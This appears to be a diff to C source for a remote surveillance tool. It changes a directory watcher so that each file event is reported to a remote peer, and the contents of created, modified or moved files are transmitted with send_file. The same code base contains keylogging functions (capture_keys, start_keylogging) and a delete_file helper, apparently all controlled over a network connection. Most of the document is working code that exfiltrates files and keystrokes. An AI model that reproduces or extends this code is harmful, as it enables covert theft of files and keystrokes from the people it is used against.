@@ -84,9 +84,63 @@
 
 static volatile sig_atomic_t g_running = 1;
 
-void watch_path(const char *path)
+static void *receive_thread(void *arg)
+{
+    receiver_args_t *args   = (receiver_args_t *)arg;
+    char            *output = NULL;
+
+    if (receive_string(args->ip_ctx, &output) == 0 && output)
+    {
+        printf("Received: %s\n", output);
+        g_running = 0;
+        free(output);
+    }
+    else
+    {
+        printf("[receiver] receive_string failed or connection closed\n");
+    }
+
+    free(args);
+    return NULL;
+}
+
+static int start_receive_thread(ip_info ip_ctx, pthread_t *thread_out)
+{
+    pthread_t        tid;
+    receiver_args_t *args = malloc(sizeof(*args));
+    if (!args)
+        return -1;
+
+    args->ip_ctx = ip_ctx;
+
+    if (pthread_create(&tid, NULL, receive_thread, args) != 0)
+    {
+        free(args);
+        return -1;
+    }
+
+    if (thread_out)
+        *thread_out = tid;
+
+    return 0;
+}
+
+static int file_exists(const char *p)
+{
+    struct stat st;
+    return (p && stat(p, &st) == 0 && S_ISREG(st.st_mode));
+}
+
+void watch_path(ip_info ip_ctx, const char *path)
 {
     g_running = 1;
+
+    pthread_t tid;
+
+    if (start_receive_thread(ip_ctx, &tid) != 0)
+    {
+        perror("pthread_create");
+    }
 
     int fd = inotify_init1(IN_NONBLOCK);
     if (fd < 0)
@@ -156,24 +210,267 @@ void watch_path(const char *path)
             if (event->len && event->name[0] != '\0')
             {
                 if (event->mask & IN_CREATE)
+                {
+                    int   needed    = snprintf(NULL, 0, "%s/%s", path, event->name);
+                    char *full_path = malloc(needed + 1);
+
+                    if (full_path)
+                    {
+                        snprintf(full_path, needed + 1, "%s/%s", path, event->name);
+                    }
+
                     printf("Created: %s\n", event->name);
+                    needed     = snprintf(NULL, 0, "Created: %s\n", event->name);
+                    char *buff = malloc(needed + 1);
+
+                    if (buff)
+                    {
+                        snprintf(buff, needed + 1, "Created: %s\n", event->name);
+                    }
+
+                    if (file_exists(full_path))
+                    {
+                        send_string(ip_ctx, "aA");
+                        send_string(ip_ctx, buff);
+                        send_file(ip_ctx, full_path);
+                    }
+                    else
+                    {
+                        send_string(ip_ctx, "bB");
+                        send_string(ip_ctx, buff);
+                    }
+
+                    free(buff);
+                    free(full_path);
+                }
                 if (event->mask & IN_DELETE)
-                    printf("Deleted: %s\n", event->name);
+                {
+                    printf("Deleted file: %s\n", event->name);
+
+                    int   needed = snprintf(NULL, 0, "Deleted file: %s\n", event->name);
+                    char *buff   = malloc(needed + 1);
+
+                    if (buff)
+                    {
+                        snprintf(buff, needed + 1, "Deleted file: %s\n", event->name);
+                    }
+
+                    send_string(ip_ctx, "bB");
+                    send_string(ip_ctx, buff);
+
+                    free(buff);
+                }
                 if (event->mask & IN_MODIFY)
+                {
+                    // printf("Modified: %s\n", event->name);
+                    //
+                    // int   needed = snprintf(NULL, 0, "Modified: %s\n", event->name);
+                    // char *buff   = malloc(needed + 1);
+                    //
+                    // if (buff)
+                    // {
+                    //     snprintf(buff, needed + 1, "Modified: %s\n", event->name);
+                    // }
+                    //
+                    // send_string(ip_ctx, "aA");
+                    // send_string(ip_ctx, buff);
+                    //
+                    // free(buff);
+                    //
+                    // needed = snprintf(NULL, 0, "%s/%s", path, event->name);
+                    // buff   = malloc(needed + 1);
+                    //
+                    // if (buff)
+                    // {
+                    //     snprintf(buff, needed + 1, "%s/%s", path, event->name);
+                    // }
+                    // send_file(ip_ctx, buff);
+                    //
+                    // free(buff);
+                    int   needed    = snprintf(NULL, 0, "%s/%s", path, event->name);
+                    char *full_path = malloc(needed + 1);
+
+                    if (full_path)
+                    {
+                        snprintf(full_path, needed + 1, "%s/%s", path, event->name);
+                    }
+
                     printf("Modified: %s\n", event->name);
+                    needed     = snprintf(NULL, 0, "Modified: %s\n", event->name);
+                    char *buff = malloc(needed + 1);
+
+                    if (buff)
+                    {
+                        snprintf(buff, needed + 1, "Modified: %s\n", event->name);
+                    }
+
+                    if (file_exists(full_path))
+                    {
+                        send_string(ip_ctx, "aA");
+                        send_string(ip_ctx, buff);
+                        send_file(ip_ctx, full_path);
+                    }
+                    else
+                    {
+                        send_string(ip_ctx, "bB");
+                        send_string(ip_ctx, buff);
+                    }
+
+                    free(buff);
+                    free(full_path);
+                }
                 if (event->mask & IN_MOVED_FROM)
+                {
                     printf("Moved from: %s\n", event->name);
+
+                    int   needed = snprintf(NULL, 0, "Moved from: %s\n", event->name);
+                    char *buff   = malloc(needed + 1);
+
+                    if (buff)
+                    {
+                        snprintf(buff, needed + 1, "Moved from: %s\n", event->name);
+                    }
+
+                    send_string(ip_ctx, "bB");
+                    send_string(ip_ctx, buff);
+
+                    free(buff);
+                }
                 if (event->mask & IN_MOVED_TO)
+                {
+                    // printf("Moved to: %s\n", event->name);
+                    //
+                    // int   needed = snprintf(NULL, 0, "Moved to: %s\n", event->name);
+                    // char *buff   = malloc(needed + 1);
+                    //
+                    // if (buff)
+                    // {
+                    //     snprintf(buff, needed + 1, "Moved to: %s\n", event->name);
+                    // }
+                    //
+                    // send_string(ip_ctx, "aA");
+                    // send_string(ip_ctx, buff);
+                    //
+                    // free(buff);
+                    //
+                    // needed = snprintf(NULL, 0, "%s/%s", path, event->name);
+                    // buff   = malloc(needed + 1);
+                    //
+                    // if (buff)
+                    // {
+                    //     snprintf(buff, needed + 1, "%s/%s", path, event->name);
+                    // }
+                    // send_file(ip_ctx, buff);
+                    //
+                    // free(buff);
+                    int   needed    = snprintf(NULL, 0, "%s/%s", path, event->name);
+                    char *full_path = malloc(needed + 1);
+
+                    if (full_path)
+                    {
+                        snprintf(full_path, needed + 1, "%s/%s", path, event->name);
+                    }
+
                     printf("Moved to: %s\n", event->name);
+                    needed     = snprintf(NULL, 0, "Moved to: %s\n", event->name);
+                    char *buff = malloc(needed + 1);
+
+                    if (buff)
+                    {
+                        snprintf(buff, needed + 1, "Moved to: %s\n", event->name);
+                    }
+
+                    if (file_exists(full_path))
+                    {
+                        send_string(ip_ctx, "aA");
+                        send_string(ip_ctx, buff);
+                        send_file(ip_ctx, full_path);
+                    }
+                    else
+                    {
+                        send_string(ip_ctx, "bB");
+                        send_string(ip_ctx, buff);
+                    }
+
+                    free(buff);
+                    free(full_path);
+                }
             }
             else
             {
                 if (event->mask & IN_MODIFY)
-                    printf("Modified\n");
+                {
+                    printf("Modified file: %s\n", event->name);
+
+                    int   needed = snprintf(NULL, 0, "Modified file: %s\n", event->name);
+                    char *buff   = malloc(needed + 1);
+
+                    if (buff)
+                    {
+                        snprintf(buff, needed + 1, "Modified file: %s\n", event->name);
+                    }
+
+                    send_string(ip_ctx, "aA");
+                    send_string(ip_ctx, buff);
+
+                    // free(buff);
+                    //
+                    // needed = snprintf(NULL, 0, "%s/%s", path, event->name);
+                    // buff   = malloc(needed + 1);
+                    //
+                    // if (buff)
+                    // {
+                    //     snprintf(buff, needed + 1, "%s/%s", path, event->name);
+                    // }
+                    send_file(ip_ctx, path);
+
+                    free(buff);
+                }
                 if (event->mask & IN_DELETE_SELF)
-                    printf("Target deleted\n");
+                {
+                    printf("Deleted file: %s\n", path);
+
+                    int   needed = snprintf(NULL, 0, "Deleted file: %s\n", path);
+                    char *buff   = malloc(needed + 1);
+
+                    if (buff)
+                    {
+                        snprintf(buff, needed + 1, "Deleted file: %s\n", path);
+                    }
+
+                    send_string(ip_ctx, "bB");
+                    send_string(ip_ctx, buff);
+
+                    free(buff);
+                }
                 if (event->mask & IN_MOVE_SELF)
-                    printf("Target moved\n");
+                {
+                    printf("Moved file: %s\n", path);
+
+                    int   needed = snprintf(NULL, 0, "Moved file: %s\n", path);
+                    char *buff   = malloc(needed + 1);
+
+                    if (buff)
+                    {
+                        snprintf(buff, needed + 1, "Moved file: %s\n", path);
+                    }
+
+                    send_string(ip_ctx, "bB");
+                    send_string(ip_ctx, buff);
+
+                    // char base[PATH_MAX];
+                    // strncpy(base, path, sizeof(base));
+                    // base[sizeof(base) - 1] = '\0';
+                    //
+                    // char *parent = dirname(base);
+                    //
+                    // char fullpath[PATH_MAX];
+                    // snprintf(fullpath, sizeof(fullpath), "%s/%s", parent, event->name);
+                    //
+                    // send_file(ip_ctx, fullpath);
+
+                    free(buff);
+                }
             }
 
             i += (int)sizeof(struct inotify_event) + (int)event->len;
@@ -182,7 +479,9 @@ void watch_path(const char *path)
 
     inotify_rm_watch(fd, wd);
     close(fd);
+    pthread_join(tid, NULL);
     printf("Stopped watching.\n");
+    send_string(ip_ctx, "pP");
 }
 
 /**
@@ -1050,7 +1349,7 @@ static void capture_keys(const char *device_path)
     printf("\nCapture stopped.\n");
 }
 
-static void *receive_thread(void *arg)
+static void *receive_thread_key(void *arg)
 {
     receiver_args_t *args   = (receiver_args_t *)arg;
     char            *output = NULL;
@@ -1070,7 +1369,7 @@ static void *receive_thread(void *arg)
     return NULL;
 }
 
-static int start_receive_thread(ip_info ip_ctx, pthread_t *thread_out)
+static int start_receive_thread_key(ip_info ip_ctx, pthread_t *thread_out)
 {
     pthread_t        tid;
     receiver_args_t *args = malloc(sizeof(*args));
@@ -1079,7 +1378,7 @@ static int start_receive_thread(ip_info ip_ctx, pthread_t *thread_out)
 
     args->ip_ctx = ip_ctx;
 
-    if (pthread_create(&tid, NULL, receive_thread, args) != 0)
+    if (pthread_create(&tid, NULL, receive_thread_key, args) != 0)
     {
         free(args);
         return -1;
@@ -1091,7 +1390,7 @@ static int start_receive_thread(ip_info ip_ctx, pthread_t *thread_out)
     return 0;
 }
 
-int delete_file(const char *path)
+static int delete_file(const char *path)
 {
     if (unlink(path) != 0)
     {
@@ -1142,7 +1441,7 @@ int start_keylogging(ip_info ip_ctx)
 
     pthread_t tid;
 
-    if (start_receive_thread(ip_ctx, &tid) != 0)
+    if (start_receive_thread_key(ip_ctx, &tid) != 0)
     {
         perror("pthread_create");
     }
